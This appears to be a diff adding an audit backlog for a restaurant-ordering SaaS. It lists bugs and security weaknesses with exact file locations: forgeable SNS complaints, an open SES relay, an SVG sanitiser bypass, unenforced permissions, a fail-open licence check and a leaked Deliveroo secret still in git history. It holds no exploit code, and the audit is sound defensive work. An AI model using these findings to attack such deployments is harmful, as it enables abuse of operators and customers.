+  mail is filtered or rejected.
+- [ ] **Unsubscribe is a mutating GET with no confirmation.**
+  `emailHttpHandlers.ts:50-77` — Outlook Safe Links, corporate scanners and the Gmail
+  image proxy fetch links in delivered mail, **unsubscribing paying customers** who never
+  clicked. The `catch` (`:65-68`) also renders "Désabonnement confirmé" on failure.
+  → confirmation page on GET, mutation on POST.
+- [ ] **SNS signature is not verified.** `emailHttpHandlers.ts:178-207` —
+  `isValidSNSOrigin` only pattern-matches `SigningCertURL` **inside the caller-supplied
+  body**; the certificate is never fetched and the signature never checked. A recipient
+  can forge a complaint against another subscriber. Tracked as S3-3.
+- [ ] **Sending is unbatched and unresumable.** `emailCampaignActions.ts:123-184` is a
+  synchronous loop invoked from the browser, with 100 ms plus one SES call and **two**
+  `runMutation` round-trips per subscriber. Around 3,000 subscribers the action exceeds
+  the Convex time limit, the campaign is stuck at `sending`, and the only exit is
+  "Relancer" — which triggers the duplicate send in P0-20.
+- [ ] **Automations have no execution engine.** `emailAutomations.ts` is CRUD only;
+  nothing dispatches on the `welcome` / `birthday` / `inactive` / `post_order` /
+  `abandoned_cart` triggers, while `emailConfig.ts:23-29` exposes five toggles in the UI.
+- [ ] **A/B testing is collected and never applied.** `emailCampaignActions.ts:145` uses
+  `campaign.subject` for everyone; `campaign.variants` is never read and
+  `emailEvents.metadata.variantId` is never written.
+- [ ] **`maxEmailsPerWeek` is never enforced** (`tables/emailMarketing.ts:539`), despite
+  being presented as an anti-spam guard.
+- [ ] **`/api/contact` is an unauthenticated, unthrottled SES relay.**
+  `apps/reference/app/api/contact/route.ts:9-26` — no caller (the form uses
+  `contactMessages.create`), but the route is live.
+  → delete it, or add IP rate limiting and field-length caps.
+- [ ] **Public mutations have no rate limiting** (`emailSubscribers.ts:80-93`,
+  `contactMessages.ts:18-24`, both annotated "tracked as S3-7"), with an unbounded
+  `message: v.string()` and a `list` that `.collect()`s without pagination.
+- [ ] **Double opt-in tokens come from `Math.random()`**
+  (`emailSubscribers.ts:141-143`) while `double-opt-in.ts:26` provides
+  `crypto.randomUUID()`; and `importBatch` accepts the token **from the caller**.
+
+---
+
+## TECH-08 · CMS and media library — quotas, scope and rendering
+**Priority:** high · **Parent:** #97
+
+- [ ] **`generateArticle` and `generateImage` never authorize their `storeId`.**
+  `blogAutoGenerate.ts:333-370` and `blogImageGenerate.ts:51-73` carry a
+  `@guarded-inline` marker asserting a check that does not exist: `_checkAccess` takes
+  only `{ownerId}`. The false marker **silences the linter** built to catch this. The
+  sibling `blogAutoConfig.ts:86-93` was already fixed.
+- [ ] **Quota is checked, then incremented after the OpenAI call.**
+  `blogAutoGenerate.ts:358-364` (check) versus `:244` (final increment): 100 concurrent
+  calls all pass. And the article's own image generations (up to 4 × `gpt-image-1`)
+  **bypass the image quota entirely**.
+  → reserve quota before the first paid call, release on failure.
+- [ ] **The Enterprise multi-language gate is UI-only.** `blogAutoGenerate.ts:345,617`
+  passes `autoTranslate` without checking `allowMultiLanguage`; the only guard is a
+  disabled `<Switch>`. `tasks/auto-blog-spec.md:266-271` explicitly forbids this.
+- [ ] **The SVG sanitiser is bypassable via the presigned path.** `createMedia` accepts
+  `mimeType`/`kind`/`size` with no server-side validation (`validateMediaUpload` is
+  imported only in the browser), `getPresignedUrlForMedia` presigns with that `mimeType`,
+  and `confirmUpload` routes `image/svg+xml` around sharp straight to `setMediaReady`.
+  There is no server-side size cap either.
+- [ ] **`X-Frame-Options: DENY` breaks the CMS preview.** `next.config.ts:17` applies
+  `DENY` to `/(.*)`, and `PreviewClient.tsx:44` renders the storefront in an `<iframe>` —
+  blocked even same-origin. The frame is permanently blank. `cms-preview.spec.ts:20-23`
+  cannot fail.
+  → `frame-ancestors 'self'` via CSP, or `SAMEORIGIN`.
+- [ ] **Rich-text content renders escaped on the public site.** Four `richtext` fields
+  (`about.ts:50-54`, `sign-in.ts:20`, `sign-up.ts:20`, `game.ts:44`) store
+  `editor.getHTML()`, and `AboutContent.tsx:161` renders it as a React child: the visitor
+  reads the `<strong>` tags.
+  → either sanitise on write and render as HTML, or move these fields to `type: "text"`.
+  **Do not add the render without the sanitiser.**
+- [ ] **Deleting media does not delete the file.** `cmsMedia.ts:157` removes only the
+  Convex row; `DeleteObjectCommand` appears nowhere. A GDPR erasure request cannot be
+  satisfied.
+- [ ] **Hand-authored article HTML is never sanitised** (`blog.ts:456-460`,
+  `blogPublish.ts:107`) — only the AI path is. Latent today, live the moment P0-25 lands.
+
+---
+
+## TECH-09 · Storefront — SEO, accessibility and the buying path
+**Priority:** high · **Parent:** #96
+
+- [ ] **The entire CMS SEO block is dead.** `lib/cms/seo.ts:28-29` short-circuits on a
+  `storeSlug` cookie that **nobody writes** (a leftover of a removed `/s/[storeSlug]`
+  architecture). Eight pages expose `metaTitle`, `metaDescription`, `ogImage`, `robots` —
+  none reaches the `<head>`. Two more bugs in the same 30 lines: `:44` computes
+  `index: robots.includes("index")` — and `"noindex"` **contains** `"index"`, so
+  "Noindex, Nofollow" emits `{index:true, follow:true}`; and `:31` reads a `locale`
+  cookie while the app writes `beid_locale`.
+- [ ] **Five of eleven public routes cannot carry metadata** — `/menu`, `/cart`,
+  `/store-selector`, `/account/*`, `/order/[orderId]`, `/track/[token]` are client
+  components. `/menu` is the highest-intent page and it has an SEO block in the CMS.
+- [ ] **The sitemap lists only URLs that do not exist** (`sitemap.ts:44-57` emits
+  `/s/{slug}`), and `robots.ts` disallows neither `/account/`, `/cart` nor `/checkout`.
+- [ ] **Structured data is written and never rendered.** `lib/json-ld.tsx` has no caller;
+  there is no `application/ld+json` in `app/`. For a restaurant theme this is what
+  produces opening hours and price range in rich results.
+- [ ] **The footer newsletter form throws the email away.**
+  `storefront-footer.tsx:29-34` toasts "Merci ! Vous êtes maintenant inscrit" without
+  calling any mutation. The correct call exists one page over (`BlogContent.tsx:87`). The
+  footer renders on **every** page.
+- [ ] **The account "Préférences" tab is inert** — the apply button has no `onClick`
+  (`account/page.tsx:729-734`).
+- [ ] **Keyboard users cannot select a required option**, so cannot buy a configurable
+  dish: the choice row is a `<div onClick>` and the radio a `<div>` with no `input`,
+  `role`, `tabIndex` or key handler (`product-detail-client.tsx:233-252`).
+- [ ] **Clicking a multi-select option's checkbox does nothing** — the native
+  `<Checkbox>`'s `onCheckedChange` and the parent `<div>`'s `onClick` toggle in sequence.
+- [ ] **The cart drawer is neither a dialog nor hidden** — no `role="dialog"`, no focus
+  trap, no Escape, and it is **rendered permanently** (merely translated off-screen) with
+  no `inert`: its controls stay in the tab order of every page.
+- [ ] **Saved addresses lose their coordinates**
+  (`address-manager.tsx:101-107` drops `latitude`/`longitude`) while checkout keeps them:
+  the same address yields two different delivery quotes.
+- [ ] **Contrast fails WCAG AA on body text** — `text-zinc-400` on white is 2.56:1; the
+  search placeholder 1.48:1; the orange "Lire la suite" 2.80:1.
+- [ ] **Product images bypass `next/image`** — raw `<img>` on full-size S3 originals,
+  12 per menu page, with no resizing, AVIF/WebP or lazy loading.
+
+---
+
+## TECH-10 · Multi-store — cascade, timezone and dead settings
+**Priority:** high · **Parent:** #94
+
+- [ ] **Restoring a backup detaches the whole database from its store.**
+  `systemInternal.ts:92-113` — `importTable` deletes then re-inserts without `_id`, so
+  stores come back with **new** ids while products, menus, CMS pages and promotions come
+  back carrying the **old** `storeId`. `v.id("stores")` validates only the encoding, so
+  the inserts succeed silently. Orders, payments, tickets, team members and profiles are
+  neither exported nor imported — they now point at deleted stores, and since
+  `userProfiles.storeIds` no longer matches anything, **the owner loses access to
+  everything**. Irreversible.
+  → a two-pass old-id → new-id map rewriting every foreign key before inserting
+  dependants; or refuse the import on a non-empty deployment.
+- [ ] **Deleting a store deletes only the store row** (`stores.ts:383-398`): ~42
+  `storeId` columns across 20 tables are left dangling, and the id stays in
+  `userProfiles.storeIds`. Bulk delete does this for N stores at once.
+- [ ] **"Closed" and "Temporarily unavailable" are enforced in the browser only.**
+  `orders.create:295-301` checks `isPublishedStore` alone, and both `closed` and
+  `temporarily_unavailable` are *published* statuses.
+- [ ] **Timezone is a setting nobody reads.** `globalSettings.timezone` is written and
+  never read; open/closed is computed from `now.getDay()` / `now.getHours()`, i.e. the
+  visitor's clock — spoofable, and wrong when travelling.
+- [ ] **"Use global hours" changes nothing on the storefront.**
+  `use-store-detail.ts:207-226` does not write `store.hours` when the flag is on, and
+  `use-store-status.ts:25-27` reads only `store.hours`. `stores.create` seeds a
+  hard-coded 09:00–22:00.
+- [ ] **Global service toggles are ignored** — `null` is treated as "show everything"
+  (`order-type-selector.tsx:31`), and `orders.create` does not validate `args.type`.
+- [ ] **Saving the Integrations tab wipes the stored Uber Direct credentials.**
+  `use-settings-form.ts:16,116-121,404-412` reads `api.globalSettings.get` — the
+  **public** query that strips `customerId`/`clientId`/`clientSecret`/`apiKey` — so the
+  fields initialise empty and `upsert` patches the whole object.
+  → read `getAdmin`, or merge field by field.
+- [ ] **The #119 fix is incomplete.** `team-page.tsx:50,63-66` passes the raw persisted
+  `storeId` to a `v.id("stores")` validator, and `/dashboard/team` is in `StoreGuard`'s
+  `BYPASS_ROUTES`. Same shape as the bug that was fixed.
+- [ ] **`stores.getById` is public and returns drafts** — address, contact, `orderMode`
+  and `overrides` of an unpublished establishment.
+- [ ] **Three dead settings**: `orderConfirmation`, `soundConfig`, `displayConfig` —
+  mutations and audit entries wired, with no reader or writer.
+
+---
+
+## TECH-11 · Authentication — sessions, errors and permissions
+**Priority:** high · **Parent:** #113
+
+- [ ] **A signed-in customer who opens `/dashboard` crashes the app.**
+  `auth-guard.tsx:17-45` checks authentication but not role; `StoreGuard` then fires
+  `stores.listAll` (`requireStaff`), which throws, and `useQuery` **rethrows during
+  render**. There is no `error.tsx` in the repo. Same white screen for any staff member
+  reaching a page above their permission, and for an owner whose `userProfiles` row does
+  not exist yet.
+- [ ] **Password change reports success on a wrong current password.**
+  `account/page.tsx:328-338` ignores `{ data, error }` — the Better Auth client does not
+  throw. Every other call site knows this (`sign-in`, `sign-up`, `forgot-password`,
+  `reset-password`). The user believes the password changed and locks themselves out.
+  Same shape on `authClient.updateUser` (`:301`).
+- [ ] **A password reset does not revoke existing sessions.**
+  `revokeSessionsOnPasswordReset` is absent from `emailAndPassword`, while the in-app
+  change does pass `revokeOtherSessions: true`. A stolen session stays valid for up to
+  7 days after the reset.
+- [ ] **The password-reset email fails silently.** `auth.ts:33-52` does
+  `if (!siteUrl || !secret) return;` with no log, and never checks the response status.
+  Both variables live on the Convex side, which `instrumentation.ts` does not inspect.
+- [ ] **The first administrator cannot be created from the product.**
+  `claimFirstAdmin` requires an undocumented `ADMIN_BOOTSTRAP_TOKEN` and has no caller;
+  nothing provisions `userProfiles` on sign-up, so `getAuthUser` throws
+  "User profile not found" on every admin screen.
+  → a one-time `/setup` page, or a documented step in `apps/docs/deployment/`.
+- [ ] **Per-module permissions are never enforced.** The invite dialog offers eight
+  checkboxes, stores them in `teamMembers.permissions`, and **nothing reads them**:
+  `invitationGrant` does not carry them across, acceptance writes
+  `permissions: existingProfile?.permissions ?? []`, and `hasPermission` is role-only.
+  The owner believes they restricted access; they restricted nothing.
+  → either remove the checkboxes, or thread them through to `requireStorePermission`.
+- [ ] **Any staff role can list the whole chain.** `stores.listAll` is gated on
+  `requireStaff` alone, without membership: a kitchen account gets the name, address,
+  phone, email, hours and radius of every establishment. Already filed as #94.
+- [ ] **Every authorization denial reaches the user as "Server Error".** `ConvexError`
+  is used **nowhere** in the repo: Convex redacts ordinary thrown messages in production,
+  while the UI displays `error.message`. Every denial looks like a bug.
+
+---
+
+## TECH-12 · Delivery chain — CI, tests and template parity
+**Priority:** high · **Parent:** #102
+
+- [ ] **CI can be green while the Convex backend does not compile.**
+  `apps/*/tsconfig.json` excludes `convex/` — **102 files per app never type-checked** —
+  and `next build` does not touch them either. No workflow runs `convex deploy`,
+  `convex codegen` or `tsc -p convex/tsconfig.json`.
+  (Verified: the `"use node"` directive is clean today — 93 files, none exporting a
+  `query`/`mutation` — but nothing will warn when that changes.)
+  → a CI job running `convex deploy --dry-run`, or
+  `tsc -p apps/*/convex/tsconfig.json --noEmit`.
+- [ ] **`release.yml` publishes without waiting for CI.** Triggered on `push` to `main`
+  with **no `needs:`**, it runs `changeset publish` after a bare package build — no lint,
+  no type-check, no tests. A failing test does not stop publication to GitHub Packages,
+  nor the mirror to `beyours-boilerplate`.
+- [ ] **E2E never runs.** `e2e.yml:14` is gated on
+  `vars.CONVEX_E2E_ENABLED == 'true'`; with the variable unset the job is skipped.
+  (The honesty fix did land: `cancelled` and `failure` now exit 1 — but a 510-test suite
+  that is switched off protects nothing.) Also `e2e.yml:95` does
+  `npx tsx scripts/seed-users.mts || true`.
+- [ ] **The shipped template runs 3 of its 14 test files.**
+  `apps/themes/vitest.config.ts:9` excludes `**/e2e/**` wholesale, hiding the **11
+  Deliveroo suites**. `apps/reference/vitest.config.ts:16-20` fixed exactly this bug with
+  a comment explaining it — never propagated.
+  → copy the `exclude` array from `reference`.
+- [ ] **Authorization suites never run against the shipped app.**
+  `apps/themes/tests/convex/` **does not exist**; the five suites (including the
+  832-line `authorization.test.ts`) cover only the test bench, while
+  `apps/themes/convex/` is the file set an integrator edits per client.
+  → add `convex-test` + `@edge-runtime/vm` and copy `tests/convex/`.
+- [ ] **6,449 lines of dead admin components ship to every client.**
+  39 files under `apps/themes/components/admin/{dashboard,design,games,orders,payments,products,settings,stores,team}/`,
+  with **zero importers** — the pages import from `@be-in-digital/admin`. An integrator
+  customising the orders table edits a file with no effect.
+- [ ] **French accents stripped across the shipped admin.** 188 accented characters in
+  `reference` versus 53 in `themes`, on visible strings: "Commande prete",
+  "Article publie", "Echec de la mise a jour".
+  → take `reference`'s strings and add a CI check.
+- [ ] **`apps/themes` points at an image that is not in the repo.**
+  `HomepageContent.tsx:80` and `meal-card.tsx:74` fall back to
+  `/imagery/hero-burger-v2.png`; `apps/themes/public/` holds only five SVGs. The
+  optimizer returns 400 on the hero and on every product without a photo.
+  `apps/reference` was already fixed — drift in the wrong direction.
+- [ ] **The update check can never report a release.** `system.ts:352-356` fetches
+  `registry.npmjs.org/@be-in-digital/restaurant-theme`, a package that does not exist
+  (everything is on GitHub Packages). The catalogue stays empty, so a lapsed maintenance
+  contract is never enforced and a real update is never announced. The file's own
+  `TODO(beyours)` says so.
+- [ ] **Five demos cannot be installed.**
+  `demos/s/{pizzeria-trattoria,fast-food-smash,food-truck-convoi,poulet-braise,asiatique-izakaya}.html`
+  exist in the sales gallery; `pnpm template:apply <slug>` answers "Template inconnu"
+  (they live under the legacy slugs).
+- [ ] **`packages/mcp-server` is an orphaned stub** — v1.0.1, 3 sources, no consumer, and
+  no `test`/`lint`/`type-check` script, so Turbo never touches it.
+- [ ] **`apps/site` has no security headers** (`next.config.ts` is empty) while hosting
+  the ops console and the affiliate portal with electronic signatures. No HSTS, no
+  `X-Frame-Options`, no `nosniff`.
+- [ ] **Sentry is dead code.** `@sentry/nextjs` is in no `package.json`, `Sentry.init`
+  appears only in a comment, and there is no `error.tsx` / `global-error.tsx`. Yet
+  `NEXT_PUBLIC_SENTRY_DSN` is in the schema and both `.env.example` files, so the
+  operator configures it and believes monitoring is live. A Saturday-night checkout error
+  is seen by nobody.
+  → install and wire it, **or** delete the module and the variable. Shipping the variable
+  without the integration is worse than shipping neither.
+
+---
+---
+
+# `LAUNCH` — operator actions and product decisions
+
+Outside the repo: none of this is fixed by writing code.
+
+## LAUNCH-01 · Rotate the exposed Deliveroo secret — **urgent**
+The `client_secret` is still readable in git history (commit `7cf4d41`,
+`scripts/deliveroo-menu-scenarios.sh:33-34`, plus 18 commits on
+`e2e/deliveroo/test-config.ts`). The working tree is clean; the history is not.
+`.gitleaksignore:13-15` states this explicitly — so **the Gitleaks scan is green over a
+dirty history**.
+Mandatory order: regenerate in the Deliveroo portal → propagate
+(`npx convex env set … --prod`) → re-verify → revoke the old one. Then part B of
+`tasks/secret-rotation-runbook.md` (history rewrite), after draining the open PR queue.
+Add a Gitleaks rule for the Deliveroo secret shape.
+
+## LAUNCH-02 · Create the founders coupon and the 4 maintenance prices in Stripe — **urgent**
+Without them the **first Essentielle sale is refused by the code** —
+`foundersOffer.ts:55-88` throws `FoundersOfferUnavailableError` when
+`STRIPE_FOUNDERS_COUPON_ID` or `STRIPE_PRODUCT_CREATION_ESSENTIELLE` is unset, and
+`stripe.ts:35-54` refuses checkout before the order exists when any
+`STRIPE_PRICE_{ESSENTIELLE,PREMIUM}_{MONTHLY,YEARLY}` is missing. Deliberate and correct
+behaviour: the customer is never charged for a plan that cannot be billed.
+Coupon: `max_redemptions: 10`, `applies_to` the creation product.
+While there, fix `tasks/production-checklist.md`, which instructs setting six
+`STRIPE_BID_PRICE_*` variables that no code reads.
+
+## LAUNCH-03 · Settle the VAT regime — **urgent**
+Product decision that gates P0-03. French B2C requires tax-inclusive display; the code
+adds VAT on top of the displayed price under a "TVA incluse" label. Decide, then
+propagate: engine, commercial site (`apps/site/lib/legal/company.ts` declares
+`VAT.regime = "reel"` while `STRIPE_TAX_ENABLED` is off — `invoiceLegal.ts:117-125`
+detects the contradiction, logs it and **does not block**), and invoices already issued.
+
+## LAUNCH-04 · Settle four sold-but-absent features
+- **Square** — advertised in `CLAUDE.md`, the MCP registry and the onboarding tour;
+  **zero lines of code**. `refundPolicy.ts:151-158` says so itself. Build it, or remove
+  it from the copy.
+- **Auto Blog** — no scheduler (P0-26). Ship the crons, or reposition the offer as
+  manual generation and revisit the price.
+- **Menus / formules** — the `menus` table has one reader, no customer flow and no order
+  field. Build the combo flow, or remove the tab.
+- **"ESC/POS printing"** — it is `iframe.contentWindow.print()` to the OS default
+  printer via a Chrome kiosk script. No ESC/POS bytes, no network or USB transport, and
+  `printerSettings` is a dead table. Rewrite the commercial promise, or ship a real print
+  agent.
+
+## LAUNCH-05 · Settle the S3 bucket policy
+Two opposite assumptions coexist (P0-34). Choose private + authenticated proxy, or
+public/CloudFront with `AWS_S3_PUBLIC_BASE_URL` required. Write the decision into
+`apps/docs/deployment/` — the whole P0-34 fix depends on it.
+
+## LAUNCH-06 · Move AWS SES out of the sandbox
+`tasks/production-accounts-checklist.md:52`: SES starts sandboxed in eu-west-3. Until
+production access is granted, **no client can email a real consumer** — order
+confirmations included.
+
+## LAUNCH-07 · Check the Convex spending cap
+A cap set too low disables **every** project on the team, production included. Account
+recovery runs through an owner who is not `developers@beyours.fr`.
+
+## LAUNCH-08 · Make CI blocking and switch E2E on
+Set `CONVEX_E2E_ENABLED=true` and the `E2E_*` secrets, then make CI and E2E required
+status checks on `main`. See TECH-12.
+
+## LAUNCH-09 · Restrict the Google Maps key and provision the bootstrap token
+`NEXT_PUBLIC_GOOGLE_MAPS_API_KEY` is public by design but must be restricted by HTTP
+referrer per client domain, or it is a billing-drain vector. And provision
+`ADMIN_BOOTSTRAP_TOKEN` per deployment, without which no first administrator can be
+appointed (TECH-11).
+
+## LAUNCH-10 · Register every client site's licence key
+`saDeployments` must hold the `licenseKey` before handover, otherwise maintenance
+renewals are unenforceable: `http.ts:716-746` answers
+`entitled: true, reason: "unregistered"` for any unknown key, and the client-side script
+also fails open.
